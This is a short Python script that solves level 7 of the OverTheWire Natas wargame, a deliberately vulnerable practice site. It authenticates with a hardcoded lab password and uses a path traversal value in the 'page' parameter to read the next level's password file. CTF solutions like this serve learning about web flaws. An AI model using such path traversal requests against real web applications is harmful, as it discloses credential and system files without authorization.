# Natas7 python solution
# By Emil 'Dota' Bak, 2019

import requests

# ***********************************************
URL = "http://natas7.natas.labs.overthewire.org/"

auth_name = 'natas7'
auth_pass = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

# By path traversal, it is possible to print the password directly.
# Note all passwords are stores in /etc/natas_webpass/natas*
PARAMS = dict(page='/etc/natas_webpass/natas8')

r = s.get(URL, params=PARAMS)

for x in r.iter_lines():
    if not "<" in x:
        print x